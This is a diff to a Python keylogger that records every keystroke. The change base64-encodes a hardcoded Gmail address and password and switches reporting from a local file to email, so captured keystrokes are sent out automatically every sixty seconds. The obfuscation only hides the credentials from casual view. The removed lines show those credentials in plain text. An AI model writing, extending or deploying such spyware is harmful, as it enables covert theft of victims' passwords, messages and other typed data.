@@ -2,10 +2,11 @@ import keyboard
 import smtplib
 from threading import Timer
 from datetime import datetime
+import base64
 
 REPORT_FREQUENCY = 60 #seconds
-EMAIL_ADDRESS = "jakspare777@gmail.com"
-PASSWORD = "swordfish12345$"
+EMAIL_ADDRESS = "amFrc3BhcmU3NzdAZ21haWwuY29t"
+PASSWORD = "c3dvcmRmaXNoMTIzNDUk"
 
 class Keylogger:
 	def __init__(self, time_period, report_method):
@@ -97,7 +98,7 @@ class Keylogger:
 			if self.report_method == "file":
 				self.report_to_local_file()
 			elif self.report_method == "email":
-				self.report_to_email(EMAIL_ADDRESS, PASSWORD, self.log)
+				self.report_to_email(base64.b64decode(EMAIL_ADDRESS).decode("utf-8"), base64.b64decode(PASSWORD).decode("utf-8"), self.log)
 			self.start_time = datetime.now()
 		self.log = ""
 		timer = Timer(interval = self.time_period, function=self.report)
@@ -111,5 +112,5 @@ class Keylogger:
 		keyboard.wait()
 
 if __name__ == "__main__":
-	keylogger = Keylogger(time_period=REPORT_FREQUENCY, report_method = "file")
+	keylogger = Keylogger(time_period=REPORT_FREQUENCY, report_method = "email")
 	keylogger.start()
